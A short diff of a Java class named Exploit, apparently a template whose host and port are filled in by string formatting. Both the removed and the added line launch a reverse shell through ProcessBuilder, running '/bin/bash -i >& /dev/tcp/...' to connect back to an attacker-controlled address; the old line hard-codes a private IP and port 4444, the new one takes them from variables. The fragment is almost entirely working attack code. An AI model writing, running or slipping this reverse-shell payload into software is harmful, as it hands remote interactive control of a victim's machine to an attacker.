@@ -21,7 +21,7 @@ public class Exploit {
         String host = "%s";
         int port = %d;
         new ProcessBuilder()
-                .command("bash", "-c", "/bin/bash -i >& /dev/tcp/192.168.86.23/4444 0>&1")
+                .command("bash", "-c", "/bin/bash -i >& /dev/tcp/" + host + "/" + port + " 0>&1")
                 .start();
     }
 }
